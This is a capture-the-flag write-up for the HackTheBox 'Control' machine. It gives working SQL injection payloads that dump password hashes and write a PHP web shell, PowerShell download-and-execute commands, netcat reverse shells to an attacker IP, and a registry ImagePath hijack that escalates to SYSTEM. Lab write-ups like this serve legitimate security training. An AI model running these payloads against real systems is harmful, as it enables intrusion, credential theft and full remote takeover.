# Control [HTB](https://app.hackthebox.com/machines/218)
![control-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/control-01.png)


## Recon 

After adding the target to my `/etc/hosts` file, I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 control.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/ports-02.png)


From here I send `nmap` to probe the found ports for more info:

```bash
nmap -p 80,135,3306,49666,49667 -sCV control.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/nmap-res-03.png)


We have the following:

+ An IIS server on port 80.
+ Three RPC services on ports 135, 49666 & 49667.
+ A MySQL database on port 3306.


Scrolling through the list, the most interesting entries are the IIS and SQL servers. Let's start with the IIS. 


## IIS Port 80

Browsing towards `http://control.htb/` returns the following page:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/site-04.png)


At the top strip we can see a couple of interesting links. The `Admin` and `Login` buttons link to a `admin.php` script, the `About` button links to `about.php`. We can also see the phrase [Fidelity](https://en.wikipedia.org/wiki/Fidelity_Investments) at the strip, which from my google searches is an invesment company.


Taking a look at the source code of the page we can see an interesting comment:

![comment-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/comment-05.png)


It's a small To Do list, with the last note being the most interesting, as it presents a UNC path to a host of `192.168.4.28`. I tried to look for the `/myfiles` directory on website as well but to no avail. 


Instead, I ran a directory and file scan using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://control.htb/FUZZ -e .txt,.html,.config,.php
```

![ffuf-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/ffuf-06.png)


There are a few new entries found by the scan, with the most interesting entries being the `uploads` directory and the `database.php` & `license.txt` files. 


The `uploads` directory currently returns a `403` fobidden response, the `database.php` I believe serves as the connection mechanism to the database, which probably means it contains credentials. 


The `license.txt` file reads as such:

![license-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/license-07.png)


This file is quite large, and I don't think it's really worth the read. I searched for the phrase `Creative Commons Attribution 3.0 Unported` online to see if I can find any useful information but without much success.


At this point I decided to take a look at the admin page, but clicking on the link results in the following response:

![err-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/err-08.png)


It looks like the server is expecting us to go through a proxy to get this page. In order to bypass this we can try to use the [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) header, commonly used to identify the orignal source IP of proxied traffic. 


I supplied different values for the `X-Forwarded-For` haeder until I found that `192.168.4.28` works:

![worked-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/worked-10.png)


From here, I capture a request to the `admin.php` page in my Burp proxy, add the header and get the admin page:

![admin-page-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/admin-page-11.png)


### Admin Page

In the admin page, all the features interact in some capacity with the underlying database. You either search for stuff, update stuff, create stuff, or delete stuff, everything that has to do with a database. Therefore, SQLI becomes my main focus. 


The feature that caught my eye the most was the product lookup feature. I captured a request in Burp, added the `X-Forwarded-For` header, and sent the request to Repater so I can play with it easily. 


I saw a `p` product in the admin page, so I decided to use it for our exploit. I start by trying to break the SQL statement by appending an apostrophe character at the end:

![broke-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/broke-13.png)


This is reflected SQLI, as the server graciously returns any exceptions it encouterd while processing our query. We can also see that the underlying database is actually `MariaDB`, good to know. 


From this point, I want to find a payload that fits the current structure of the table, so that later we can formulate more advanced queries to fetch information from deeper within the database. 


To do this, I use the `ORDER BY` statement, where I start with `ORDER BY 1 #`, to enumerate the number of columns in the table. If I see an error, I increment to `ORDER BY 1,2 #`, etc, until I dont get an error, which indicates that the number of columns was accepted by the server.


In this case it's a bit easier, as the names of the cloumns are displayed on the page, and we can see 5 of them. But nevertheless, I performed the test manually to verify it and found a working payload of `ORDER BY 1,2,3,4,5 #` works:

![works-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/works-14.png)


Now I try to pull off a more advanced search, using the `UNION SELECT` statements I want to retrieve data from deeper in the server. Specifically, I want to see if I can get the server's version. At first I sent the following payload `p' UNION SELECT 1,@@version,3,4,5 #` which resulted in a new error:

![new-err-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/new-err-15.png)


The server complains about a mismatch in column numbers. So I start playing around with the column numbers until I found that the following statement `p' UNION SELECT 1,@@version,3,4,5,6 #` works:

![version-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/version-16.png)


From here, I try to penetrate deeper into the database, by retrieving the available tables using the following statement `p' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables #` which resulted in quite a large list, so I captured the most interesting table:

![tables-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/tables-17.png)


From here, I use the following payload `p' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='user' #` to dump out all the columns from the `user` table. I won't add a screenshot here, since the result is quite large, but here some of the more interesting columns:

```sql
User
Password
Insert_priv
Update_priv
Create_priv
Process_priv
File_priv
Grant_priv
Show_db_priv
Super_priv
Execute_priv
Create_user_priv
authentication_string
is_role
```

These are actually [MariaDB privs](https://mariadb.com/kb/en/mysql-user-table/), which are like access controls on database users. They control what each user is able to do on the server.  


At this point, I try to get the `User`, `Password`, `show_db_priv`, `file_priv` & `super_priv` columns with the following statement: `p' UNION SELECT user,password,show_db_priv,file_priv,super_priv FROM mysql.user #`:

![hashes-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/hashes-18.png)


Here are all the users:

```bash
root 	0A4A5CAD344718DC418035A1F4D292BA603134D8  Y  Y	Y 
manager	CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA  N  Y  N
hector	0E178792E8FC304A2E3133D535D38CAF1DA3CD9D  Y  Y  Y
```

We can see that `hector` and `root` are two privileged users. If we [identify](https://hashes.com/en/tools/hash_identifier) the hashes we will find that they are SHA1. 


I looked up the hashes in [crackstation](https://crackstation.net/), I manged to find the password for the `manager` which is `l3tm3!n`:

![manager-pass-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/manager-pass-19.png)


And `hector`'s password of `l33th4x0rhector`: 

![hector-pass-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/hector-pass-20.png)


Though trying to login to the MySQL database from our atack machine is denied:

![mysql-fail-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/mysql-fail-21.png)


So we need to think of a different way to get access to the system. 


If we check under which user the current database instance is running with `p' UNION SELECT 1,user(),3,4,5,6 #` we can see the following:

![runnin-as-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/running-as-22.png)


We are running as the `manager` user, we know that this user has the `File_priv` enabled, which means we can use the `LOAD_FILE()` function to read files from the system:

![read-files-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/read-files-23.png)


Though this privilge can also be used to write data into files, which can be leveraged to upload PHP code into a file located somewhere on the root of the web server. That way, we can access it externally and get a shell. 


The first step is to find the root of the web server by retrieving a file we know to be there, for example the `license.txt` file. Luckily for me, my first guess of `/inetpub/wwwroot/license.txt` actually worked:

![server-root-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/server-root-24.png)


From here, I try to write a simple test file using `p' UNION SELECT 1,'this is a test',3,4,5,6 INTO OUTFILE '/inetpub/wwwroot/test.txt' #`, which resulted in the following response:

![test-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/test-25.png)


But if we try to retrieve the file from the web server it is there:

![present-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/present-26.png)


Nice!! 


From here, I write a simple PHP web shell using: `p' UNION SELECT '<?php+system($_GET["cmd"]); ?>',null,null,null,null,null INTO OUTFILE '/inetpub/wwwroot/htb.php' #`. Interacting with this file gets us RCE:

![rce-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/rce-27.png)


From here, it's just a matter of finding a working payload for a shell. At first, I tried to use `nishang`'s [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script. I hosted it via a python web server, and sent the target to retrieve and execute it using the following payload:

```powershell
powershell  -exec bypass-c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.63/pshell.ps1') | powershell -noprofile -"
```


I then URL encoded the payload in Burp's Encoder, and sent it to the target via `curl`. Although I could see the target fetching the script from my attack machine, I didn't get a connection.  


I also used the following payload, to make the target execute `nc64.exe` hosted by an SMB server on my attack machine, and connect back to me through the UNC path:

```powershell
cmd -c "\\10.10.14.63\c\nc64.exe -e cmd 10.10.14.63 443"
```

This completely faild, as I didn't even get a connection to my SMB server. I also tried executing similar methods using a base64 encoded string with powershell but to no avail.


Eventually, I tried to use [this powershell script](https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1) from `martinsohn`. I used the same setup as with `Nishang`'s script. and this time it worked:

![shell-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/shell-28.png)


Maybe there is an anti-virus blocking Nishang's script?


At any case, let's get to privesc! 


## Privilege Escalation

If we have a look around the `C:\\inetpub\wwwroot` directory, we can see the following:

![wwwroot-dir-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/wwwroot-dir-29.png)


The `database.php` has a connection string using the `manager`'s creds to make connections to the database, but this isn't new information. 


The `uploads` directory is a troll:

![uploads-dir-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/uploads-dir-30.png)


If we check our `Se` privileges we can see we have the `Impersonate` privilege enabled:

![priv-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/priv-31.png)


This is often the case with Windows service accounts. If we check the OS build with `Get-ComputerInfo` we can see its a 2019 Windows server:

![sysinfo-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/sysinfo-32.png)


So we can use something like [Rouge Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato) to escalate to NT AUTHORITY, but it will be to easy. 


If we list out the contents of the `C:\\Users` directory we can see `hector`:

![sys-users-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/sys-users-33.png)


If we take a look at the running processes on the system we can see the following:

```cmd
netstat -ano | findstr TCP
```

![netstat-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/nettstat-34.png)


We have port 5985 running on the target which is an HTTP WinRM endpoint. Since it didn't show up in our inital `nmap` scan, it's probably been firewalled off. But we can tunnel this port to our attack with [chisel](https://github.com/jpillora/chisel).


In the `latest releases` link I download the `chisel_1.9.1_windows_amd64.gz` package to my attack machine. Then I extract it with `gunzip` and name it `c.exe`. 


I then host the file up via a python web server:

```bash
python3 -m http.server 80
```

I then `cd` into the `C:\windows\system32\spool\drivers\color` directory on the target and download the file using:

```powershell
iwr "http://10.10.14.63/c.exe" -OutFile c.exe
```

Next, I start the chisel server on my attack machine as such:

```bash
chisel server -p 4545 --reverse
```

I then connect from the target to my server and establish the tunnel:

```cmd
.\c.exe client 10.10.14.63:4545 R:5985:127.0.0.1:5985
```

On my server I receive the connection and the tunnel is established:

![tunnel-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/tunnel-34.png)


From here I use `evil-winrm` to get a shell as `hector`:

```bash
evil-winrm -i 127.0.0.1 -u hector -p 'l33th4x0rhector'
```

![hector-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/hectro-36.png)


### Hector

After landing on a shell as `hector`, I start enumerating he's account, looking into interesting groups he might belong to, any useful peremissions in the filesystem, any custom software he might have installed, etc. 


I also go through `hector`'s files, eventually I get to he's powershell history file at `C:\Users\hector\Appdata\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` which reads like this:

![ps-history-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/ps-histroy-37.png)


The first command gets all keys under `HKLM:\SYSTEM\CurrentControlset`, one of which is `Services`:

![controlset-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/services-38.png)


The second command uses the `Get-Acl` cmdlet to return the access control information on the `CurrentControlSet` key itself. But we primarly interested in the `Services` key under `CurrentControlSet`. 


To list the ACL of the `Services` key, we can use the `Get-Acl` cmdlet, and convert the Sddl into human readable format using the `ConvertFrom-SddlString` as such:

```powershell
$acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services
ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
```

![convert-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/convert-39.png)


We can see `hector` has full control over services on the system. To exploit this, we need to find a service runinng as SYSTEM which we can restart, and overwrite it's `ImagePath` value. This value instructs the service what to execute at launch, so after we restart the service we can tell it to give us a shell. 


So we need to find a service that we can restart and that runs as SYSTEM, the issue is that we don't have permissions to commands like `sc queryex` or `tasklist`, Nor do we have access to powershell's `Get-Service` cmdlet. So I wasn't sure how we can enumerate the services to find the right one to exploit. 


Eventually I decided to make make an educated guess and go for the `wuauserv` service, since I have exploited in the past using Potato attacks. 


To exploit this, we need to grab a copy of `nc64.exe` to the target, I use a python web server on my attack machine and `iwr` to download it from the target. 


Then, I use the following command, to overwrite the `ImagePath` key of the service with my reverse shell payload:

```powershell
reg.exe add hklm\system\currentcontrolset\services\wuauserv /v imagepath /t REG_EXPAND_SZ /d "C:\windows\system32\spool\drivers\color\nc.exe 10.10.14.63 636 -e cmd.exe" /f
```

![reg-add-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/reg-add-40.png)


From here I start my local listener with:

```bash
rlwrap nc -lnvp 636
```

And restart the service which stalls for a bit before returning an error:

```powershell
start-service wuauserv
```

![err-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/err-41.png)


But in the mean time I get a shell as the SYSTEM:

![root-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Control/img/root-42.png)
